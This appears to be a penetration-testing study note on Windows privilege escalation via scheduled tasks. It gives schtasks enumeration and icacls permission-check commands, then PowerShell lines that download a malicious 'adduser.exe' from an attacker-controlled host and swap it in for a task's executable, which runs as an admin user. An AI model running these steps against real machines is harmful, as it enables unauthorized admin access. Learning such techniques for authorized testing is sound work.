# scheduled tasks

_<mark style="background-color:purple;">**view scheduled tasks**</mark>_\
Three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:

* <mark style="color:blue;">As which user account (principal) does this task get executed?</mark>
* <mark style="color:blue;">What triggers are specified for the task?</mark>
* <mark style="color:blue;">What actions are executed when one or more of these triggers are met?</mark>

```powershell
schtasks /query /fo LIST /v
```

* &#x20;`schtasks` - view scheduled tasks on Windows
* `/fo LIST` - specify the output format as list
* `/v` -  display all properties of a task
  * <mark style="background-color:blue;">check</mark> <mark style="background-color:blue;"></mark>_<mark style="background-color:blue;">Author</mark>_<mark style="background-color:blue;">,</mark> <mark style="background-color:blue;"></mark>_<mark style="background-color:blue;">TaskName</mark>_<mark style="background-color:blue;">,</mark> <mark style="background-color:blue;"></mark>_<mark style="background-color:blue;">Task To Run</mark>_<mark style="background-color:blue;">,</mark> <mark style="background-color:blue;"></mark>_<mark style="background-color:blue;">Run As User</mark>_<mark style="background-color:blue;">, and</mark> <mark style="background-color:blue;"></mark>_<mark style="background-color:blue;">Next Run Time</mark>_ <mark style="background-color:blue;"></mark><mark style="background-color:blue;">fields</mark>
  * e.g _Run As User_ is an admin user, _Last Run Time_ and _Next Run Time_ indicate that the task is executed every minute, runs in current users directory

filter results to ones that include the string moss

```powershell
schtasks /query /fo LIST /v | findstr /i "moss" 
```

_<mark style="background-color:purple;">**check permissions of task**</mark>_

{% code overflow="wrap" %}
```powershell
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```
{% endcode %}

_<mark style="background-color:purple;">**upload malicious executable**</mark>_

_use adduser.exe_

{% code overflow="wrap" %}
```powershell
iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```
{% endcode %}

* download on windows machine
* create backup of the file being replaced
* replace file
